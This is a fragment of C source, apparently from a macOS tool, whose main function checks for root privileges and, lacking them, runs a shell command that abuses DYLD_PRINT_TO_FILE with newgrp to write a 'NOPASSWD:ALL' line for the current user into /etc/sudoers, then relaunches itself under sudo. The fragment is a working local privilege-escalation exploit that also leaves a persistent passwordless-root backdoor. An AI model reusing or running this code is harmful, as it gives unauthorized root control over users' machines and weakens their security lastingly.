...
int main(int argc, char **argv) {
    ...
    if (geteuid()) {
        printf("[-] No root privileges, try running with sudo...\n");
        // Get root privilege.
        char cmd[1024];
        sprintf(cmd, "echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo %s", argv[0]);
        system(cmd);
        exit(1);
    }
